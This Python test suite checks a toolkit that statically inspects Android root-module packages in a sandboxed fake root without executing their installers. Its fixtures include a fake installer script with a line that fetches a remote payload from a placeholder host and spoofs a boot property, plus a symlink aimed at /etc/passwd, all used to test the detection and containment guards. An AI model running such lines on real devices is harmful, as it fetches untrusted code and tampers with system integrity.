from __future__ import annotations

import contextlib
import importlib.util
import io
import json
import os
import subprocess
import sys
import tempfile
import types
import unittest
import zipfile
from unittest import mock
from pathlib import Path


REPO = Path(__file__).resolve().parents[1]
SCRIPT = REPO / "scripts" / "otast-playbook.sh"
UPSTREAM = REPO / "scripts" / "upstream-target-package.py"
GUARD = REPO / "scripts" / "otast_safety_guard.py"


class PlaybookContractTests(unittest.TestCase):
    def run_playbook(self, *args: str) -> subprocess.CompletedProcess[str]:
        env = os.environ.copy()
        env["NO_COLOR"] = "1"
        env["OTAST_REPO_ROOT"] = str(REPO)
        return subprocess.run(
            ["bash", str(SCRIPT), *args],
            cwd=REPO,
            env=env,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=20,
            check=False,
        )

    def test_playbook_files_are_present(self) -> None:
        required = (
            "scripts/otast-playbook.sh",
            "scripts/otast-playbook-completion.bash",
            "scripts/otast-playbook-self-test.sh",
            "scripts/prove-device-fake-root.sh",
            "scripts/export-fake-root-analysis.sh",
            "scripts/qualify-release-candidate.sh",
            "scripts/release-device.sh",
            "scripts/validate-device-release-proof.py",
            "scripts/upstream-target-package.py",
            "scripts/otast_safety_guard.py",
            "scripts/otast-maintenance.py",
            "docs/PLAYBOOK.md",
            "docs/MAINTENANCE.md",
            ".github/workflows/target-monitor.yml",
        )
        for relative in required:
            self.assertTrue((REPO / relative).is_file(), relative)

    def test_main_help_lists_primary_lifecycle(self) -> None:
        result = self.run_playbook("help")
        self.assertEqual(result.returncode, 0, result.stderr)
        for command in ("maintain", "review", "accept", "prepush", "synthetic", "capture", "refresh", "upstream", "prove", "export", "qualify", "release"):
            self.assertIn(command, result.stdout)

    def test_command_help_describes_reboot_boundary(self) -> None:
        result = self.run_playbook("help", "action")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("apply -> verify fails before reboot -> reboot -> verify passes", result.stdout)

    def test_release_help_is_single_resumable_interface(self) -> None:
        result = self.run_playbook("help", "release")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("run exactly the same command again", result.stdout)
        self.assertIn("NO_CHANGES_REQUIRED", result.stdout)
        self.assertIn("publish that exact already-validated draft without rebuilding", result.stdout)

    def test_source_mode_defines_otast_function(self) -> None:
        env = os.environ.copy()
        env["NO_COLOR"] = "1"
        env["OTAST_REPO_ROOT"] = str(REPO)
        result = subprocess.run(
            [
                "bash",
                "-c",
                'source "$1" && declare -F otast >/dev/null && otast version',
                "_",
                str(SCRIPT),
            ],
            cwd=REPO,
            env=env,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=20,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("OTAST playbook v5.2", result.stdout)

    def test_playbook_does_not_define_unused_colour_symbols(self) -> None:
        content = SCRIPT.read_text(encoding="utf-8")
        for retired_symbol in (
            "OTAST_PB_DIM",
            "OTAST_PB_GREEN",
            "OTAST_PB_YELLOW",
            "OTAST_PB_BLUE",
        ):
            self.assertNotIn(retired_symbol, content)

    def test_local_empty_assignments_are_explicit(self) -> None:
        content = SCRIPT.read_text(encoding="utf-8")
        self.assertNotIn("local tag= asset= asset_regex=", content)
        self.assertIn("local tag=''", content)
        self.assertIn("local asset=''", content)
        self.assertIn("local asset_regex=''", content)

    def test_completion_avoids_command_substitution_arrays(self) -> None:
        completion = (REPO / "scripts/otast-playbook-completion.bash").read_text(
            encoding="utf-8"
        )
        self.assertNotIn("COMPREPLY=( $(", completion)
        self.assertNotIn("COMPREPLY+=( $(", completion)
        self.assertNotIn("previous=${COMP_WORDS", completion)
        self.assertIn("mapfile -t COMPREPLY", completion)

    def test_wrapper_delegates_to_repository_entrypoints(self) -> None:
        content = SCRIPT.read_text(encoding="utf-8")
        for entrypoint in (
            "scripts/test.sh",
            "scripts/fake-magisk-root.sh",
            "scripts/capture-device-fixture.sh",
            "scripts/reset-fake-magisk-root.sh",
            "scripts/validate-fake-magisk-root.sh",
            "scripts/prove-device-fake-root.sh",
            "scripts/export-fake-root-analysis.sh",
            "scripts/qualify-release-candidate.sh",
            "scripts/release-device.sh",
            "scripts/upstream-target-package.py",
            "scripts/otast_safety_guard.py",
            "scripts/otast-maintenance.py",
        ):
            self.assertIn(entrypoint.removeprefix("scripts/"), content)

    def test_refresh_help_explains_inert_installer_evidence(self) -> None:
        result = self.run_playbook("help", "refresh")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("complete ZIP/source/installer evidence", result.stdout)
        self.assertIn("No upstream script or binary is executed", result.stdout)
        self.assertIn("No VM or proot", result.stdout)

    def test_branch_ref_help_is_explicit(self) -> None:
        refresh = self.run_playbook("help", "refresh")
        self.assertEqual(refresh.returncode, 0, refresh.stderr)
        self.assertIn("--ref REF", refresh.stdout)
        self.assertIn("Branch-monitored", refresh.stdout)
        upstream = self.run_playbook("help", "upstream")
        self.assertEqual(upstream.returncode, 0, upstream.stderr)
        self.assertIn("fetch-ref", upstream.stdout)
        self.assertIn("exact Git commit SHA", upstream.stdout)

    def test_ref_and_release_selectors_are_mutually_exclusive(self) -> None:
        result = self.run_playbook(
            "refresh", "upstream", "yurikey", "--ref", "main", "--tag", "v3.0.5"
        )
        self.assertEqual(result.returncode, 2)
        self.assertIn("--ref cannot be combined", result.stderr)

    def test_fetch_ref_binds_archive_to_immutable_commit(self) -> None:
        old_home = os.environ.get("HOME")
        with tempfile.TemporaryDirectory() as raw_home:
            home = Path(raw_home)
            os.environ["HOME"] = str(home)
            sys.path.insert(0, str(UPSTREAM.parent))
            try:
                spec = importlib.util.spec_from_file_location(
                    "otast_upstream_ref_test", UPSTREAM
                )
                self.assertIsNotNone(spec)
                self.assertIsNotNone(spec.loader)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)

                commit_sha = "5" * 40

                def fake_download(
                    repository: str, resolved: str, destination: Path
                ) -> int:
                    self.assertEqual(repository, "Yurii0307/yurikey")
                    self.assertEqual(resolved, commit_sha)
                    with zipfile.ZipFile(destination, "w") as archive:
                        archive.writestr("yurikey-source/config.json", "{}\n")
                        archive.writestr(
                            "yurikey-source/Module/module.prop",
                            "id=Yurikey\nversion=v3.0.5\n",
                        )
                        archive.writestr(
                            "yurikey-source/Module/service.sh",
                            "#!/system/bin/sh\nexit 0\n",
                        )
                    return destination.stat().st_size

                args = types.SimpleNamespace(
                    target="yurikey",
                    ref="main",
                    output_root=str(home / ".cache/otast/upstream-candidates"),
                    force=False,
                )
                output = io.StringIO()
                fixture_uid = home.stat().st_uid
                with mock.patch.object(
                    module.os, "geteuid", return_value=fixture_uid
                ), mock.patch.object(
                    module,
                    "commit_record",
                    return_value={
                        "sha": commit_sha,
                        "html_url": (
                            "https://github.com/Yurii0307/yurikey/commit/"
                            + commit_sha
                        ),
                    },
                ), mock.patch.object(
                    module, "download_archive", side_effect=fake_download
                ), contextlib.redirect_stdout(output):
                    rc = module.command_fetch_ref(args)

                self.assertEqual(rc, 0)
                metadata = json.loads(output.getvalue())
                self.assertEqual(
                    metadata["provenance"]["resolved_commit"], commit_sha
                )
                self.assertEqual(
                    metadata["provenance"]["source_kind"],
                    "github-ref-archive",
                )
                self.assertEqual(
                    metadata["module_root"], "yurikey-source/Module"
                )
                self.assertTrue(Path(metadata["package"]).is_file())
                self.assertTrue(Path(metadata["source_tree"]).is_dir())
            finally:
                try:
                    sys.path.remove(str(UPSTREAM.parent))
                except ValueError:
                    pass
                if old_home is None:
                    os.environ.pop("HOME", None)
                else:
                    os.environ["HOME"] = old_home

    def test_source_archive_module_root_is_supported(self) -> None:
        with tempfile.TemporaryDirectory() as raw_home:
            home = Path(raw_home)
            package = home / "yurikey-source.zip"
            with zipfile.ZipFile(package, "w") as archive:
                archive.writestr("yurikey-abc123/config.json", "{}\n")
                archive.writestr(
                    "yurikey-abc123/Module/module.prop",
                    "id=Yurikey\nversion=v3.0.5\n",
                )
                archive.writestr(
                    "yurikey-abc123/Module/service.sh",
                    "#!/system/bin/sh\nexit 0\n",
                )
            env = os.environ.copy()
            env["HOME"] = str(home)
            output_root = home / ".cache/otast/upstream-candidates"
            result = subprocess.run(
                [
                    "python3",
                    str(UPSTREAM),
                    "analyse",
                    "yurikey",
                    str(package),
                    "--output-root",
                    str(output_root),
                ],
                cwd=REPO,
                env=env,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=20,
                check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            metadata = json.loads(result.stdout)
            self.assertEqual(metadata["module_root"], "yurikey-abc123/Module")
            self.assertTrue(
                Path(metadata["source_tree"])
                .joinpath("yurikey-abc123/config.json")
                .is_file()
            )

    def test_static_materialization_retains_installer_code_without_execution(self) -> None:
        with tempfile.TemporaryDirectory() as raw_home:
            home = Path(raw_home)
            root = home / ".cache/otast/fake-roots/candidate"
            active = root / "data/adb/modules/playintegrityfix"
            active.mkdir(parents=True)
            (root / "data/adb/.otast-fake-root").write_text("1\n", encoding="utf-8")
            (active / "module.prop").write_text("id=playintegrityfix\nversion=old\n", encoding="utf-8")
            (active / "service.sh").write_text("#!/system/bin/sh\nexit 0\n", encoding="utf-8")

            escaped_marker = home / "SHOULD_NOT_EXIST"
            package = home / "pif.zip"
            customize = (
                "#!/system/bin/sh\n"
                "SKIPUNZIP=1\n"
                "MODPATH=/data/adb/modules/$MODID\n"
                ". \"$MODPATH/common_func.sh\"\n"
                f"touch {escaped_marker}\n"
                "resetprop -n ro.boot.vbmeta.size 20480\n"
                "curl https://example.invalid/payload\n"
            )
            with zipfile.ZipFile(package, "w") as archive:
                archive.writestr("module.prop", "id=playintegrityfix\nversion=test\n")
                archive.writestr("service.sh", "#!/system/bin/sh\nexit 0\n")
                archive.writestr("common_func.sh", "#!/system/bin/sh\nhelper=1\n")
                archive.writestr("customize.sh", customize)
                archive.writestr("install.sh", "#!/system/bin/sh\nexit 99\n")
                archive.writestr("META-INF/com/google/android/updater-script", "#MAGISK\n")
                archive.writestr("zygisk/arm64-v8a.so", b"\x7fELF" + b"\x00" * 32)

            env = os.environ.copy()
            env["HOME"] = str(home)
            result = subprocess.run(
                [
                    "python3",
                    str(UPSTREAM),
                    "materialize",
                    "playintegrityfix",
                    str(package),
                    str(root),
                    "--tree",
                    "modules_update",
                ],
                cwd=REPO,
                env=env,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=20,
                check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertFalse(escaped_marker.exists(), "installer code was unexpectedly executed")

            module = root / "data/adb/modules_update/playintegrityfix"
            self.assertTrue((module / "module.prop").is_file())
            self.assertTrue((module / "service.sh").is_file())
            self.assertTrue((module / "zygisk/arm64-v8a.so").is_file())
            self.assertFalse((module / "customize.sh").exists())
            self.assertFalse((module / "install.sh").exists())
            self.assertFalse((module / "META-INF").exists())

            marker = json.loads((root / "upstream-materialization.json").read_text(encoding="utf-8"))
            self.assertEqual(marker["qualification"], "STATIC_INSTALL_MODEL_ONLY")
            self.assertFalse(marker["installer_executed"])
            self.assertTrue(marker["installer_code_retained"])

            evidence_dir = Path(marker["evidence_dir"])
            self.assertTrue((evidence_dir / "source-tree/customize.sh").is_file())
            self.assertTrue((evidence_dir / "source-tree/install.sh").is_file())
            self.assertTrue(
                (evidence_dir / "source-tree/META-INF/com/google/android/updater-script").is_file()
            )
            analysis = json.loads((evidence_dir / "installer-analysis.json").read_text(encoding="utf-8"))
            self.assertEqual(analysis["analysis_mode"], "STATIC_ONLY_NO_EXECUTION")
            self.assertEqual(analysis["model_status"], "STATIC_MODEL_INCOMPLETE")
            categories = {finding["category"] for finding in analysis["findings"]}
            self.assertIn("NETWORK_OPERATION", categories)
            self.assertIn("PRIVILEGED_ANDROID_OPERATION", categories)
            surfaces = analysis["path_surfaces"]
            self.assertEqual(surfaces["policy"], "REPORT_ONLY_SOURCE_BYTES_UNCHANGED")
            self.assertFalse(surfaces["literal_rewrite_performed"])
            self.assertGreaterEqual(surfaces["counts"]["literal_data_adb"], 1)
            self.assertGreaterEqual(surfaces["counts"]["path_variable_assignments"], 1)
            self.assertGreaterEqual(surfaces["counts"]["sourced_helpers"], 1)
            self.assertGreaterEqual(surfaces["counts"]["unresolved_variable_paths"], 1)
            self.assertEqual(customize, (evidence_dir / "source-tree/customize.sh").read_text(encoding="utf-8"))

            sidecars = list((root / ".otast/upstream-evidence/playintegrityfix").glob("*/shell-source/customize.sh"))
            self.assertEqual(len(sidecars), 1)
            self.assertEqual(sidecars[0].read_text(encoding="utf-8"), customize)

    def test_compare_reports_active_candidate_delta(self) -> None:
        with tempfile.TemporaryDirectory() as raw_home:
            home = Path(raw_home)
            root = home / ".cache/otast/fake-roots/candidate"
            active = root / "data/adb/modules/playintegrityfix"
            staged = root / "data/adb/modules_update/playintegrityfix"
            active.mkdir(parents=True)
            staged.mkdir(parents=True)
            (root / "data/adb/.otast-fake-root").write_text("1\n", encoding="utf-8")
            (active / "module.prop").write_text("id=playintegrityfix\nversion=old\n", encoding="utf-8")
            (staged / "module.prop").write_text("id=playintegrityfix\nversion=new\n", encoding="utf-8")
            env = os.environ.copy()
            env["HOME"] = str(home)
            result = subprocess.run(
                ["python3", str(UPSTREAM), "compare", "playintegrityfix", str(root)],
                cwd=REPO,
                env=env,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=20,
                check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report = json.loads(result.stdout)
            self.assertEqual(report["classification"], "DIFFERENT")
            self.assertEqual(report["interpretation"], "ACTIVE_DEVICE_CAPTURE_VS_STATIC_CANDIDATE_DELTA")
            self.assertEqual(report["changed"][0]["path"], "module.prop")

    def test_guard_contract_rejects_root_and_symlink_components(self) -> None:
        spec = importlib.util.spec_from_file_location("otast_safety_guard_test", GUARD)
        self.assertIsNotNone(spec)
        self.assertIsNotNone(spec.loader)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)

        with mock.patch.object(module.os, "geteuid", return_value=0):
            with self.assertRaises(module.GuardError):
                module.require_non_root("test operation")

        with tempfile.TemporaryDirectory() as raw_home:
            home = Path(raw_home)
            allowed = home / ".cache/otast/fake-roots"
            real_root = allowed / "real"
            adb = real_root / "data/adb"
            adb.mkdir(parents=True)
            (adb / ".otast-fake-root").write_text("1\n", encoding="utf-8")
            linked = allowed / "linked"
            linked.symlink_to(real_root, target_is_directory=True)
            fixture_uid = real_root.stat().st_uid
            self.assertNotEqual(fixture_uid, 0, "contract tests must run unprivileged")
            with mock.patch.object(module.Path, "home", return_value=home):
                with mock.patch.object(module.os, "geteuid", return_value=fixture_uid):
                    self.assertEqual(module.assert_fake_root(real_root), real_root.resolve())
                    with self.assertRaises(module.GuardError):
                        module.assert_fake_root(linked)
                with mock.patch.object(module.os, "geteuid", return_value=fixture_uid + 1):
                    with self.assertRaises(module.GuardError):
                        module.assert_fake_root(real_root)

    def test_guard_accepts_only_relative_internal_fake_root_symlinks(self) -> None:
        spec = importlib.util.spec_from_file_location("otast_safety_guard_links", GUARD)
        self.assertIsNotNone(spec)
        self.assertIsNotNone(spec.loader)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)

        with tempfile.TemporaryDirectory() as raw_home:
            home = Path(raw_home)
            root = home / ".cache/otast/fake-roots/links"
            adb = root / "data/adb"
            target = adb / "modules/.TA_utl/prop.sh"
            target.parent.mkdir(parents=True)
            target.write_text("ok\n", encoding="utf-8")
            (adb / ".otast-fake-root").write_text("1\n", encoding="utf-8")
            link = adb / "modules/TA_utl-link"
            link.symlink_to(".TA_utl/prop.sh")
            checked = root.resolve(strict=True)

            records = module.audit_internal_symlinks(checked)
            self.assertEqual(records[0]["path"], "data/adb/modules/TA_utl-link")
            self.assertEqual(records[0]["target"], ".TA_utl/prop.sh")

            link.unlink()
            link.symlink_to("/etc/passwd")
            with self.assertRaises(module.GuardError):
                module.audit_internal_symlinks(checked)

            link.unlink()
            outside = home / "outside"
            outside.write_text("outside\n", encoding="utf-8")
            link.symlink_to(os.path.relpath(outside, link.parent))
            with self.assertRaises(module.GuardError):
                module.audit_internal_symlinks(checked)

            link.unlink()
            link.symlink_to("missing")
            with self.assertRaises(module.GuardError):
                module.audit_internal_symlinks(checked)

    def test_analysis_export_preserves_only_guarded_internal_symlinks(self) -> None:
        content = (REPO / "scripts/export-fake-root-analysis.sh").read_text(
            encoding="utf-8"
        )
        self.assertNotIn('find "$fake_root" -type l', content)
        self.assertIn('symlink-tree "$fake_root"', content)
        self.assertIn("stat.S_IFLNK | 0o777", content)
        self.assertIn("allowed_symlink_root", content)
        self.assertIn("fake-root-symlinks.json", content)

    def test_upstream_output_root_is_strictly_cache_contained(self) -> None:
        with tempfile.TemporaryDirectory() as raw_home:
            home = Path(raw_home)
            package = home / "pif.zip"
            with zipfile.ZipFile(package, "w") as archive:
                archive.writestr("module.prop", "id=playintegrityfix\nversion=test\n")
            env = os.environ.copy()
            env["HOME"] = str(home)
            result = subprocess.run(
                [
                    "python3",
                    str(UPSTREAM),
                    "analyse",
                    "playintegrityfix",
                    str(package),
                    "--output-root",
                    str(home / "outside-cache"),
                ],
                cwd=REPO,
                env=env,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=20,
                check=False,
            )
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("must remain below", result.stderr)

    def test_self_test_does_not_write_python_bytecode(self) -> None:
        content = (REPO / "scripts/otast-playbook-self-test.sh").read_text(encoding="utf-8")
        self.assertIn("PYTHONDONTWRITEBYTECODE=1", content)
        self.assertIn("tests.test_maintenance tests.test_playbook", content)

    def test_maintenance_harness_does_not_replace_process_geteuid(self) -> None:
        content = (REPO / "tests/test_maintenance.py").read_text(encoding="utf-8")
        self.assertNotIn("module.os.geteuid =", content)

    def test_maintenance_help_and_exit_contract_are_documented(self) -> None:
        result = self.run_playbook("help", "maintain")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("10", result.stdout)
        self.assertIn("20", result.stdout)
        content = (REPO / "docs/MAINTENANCE.md").read_text(encoding="utf-8")
        self.assertIn("otast review TARGET", content)
        self.assertIn("otast accept TARGET", content)
        self.assertIn("gh auth login", content)

    def test_unknown_command_fails_cleanly(self) -> None:
        result = self.run_playbook("definitely-not-a-command")
        self.assertEqual(result.returncode, 2)
        self.assertIn("STOP:", result.stderr)


if __name__ == "__main__":
    unittest.main()
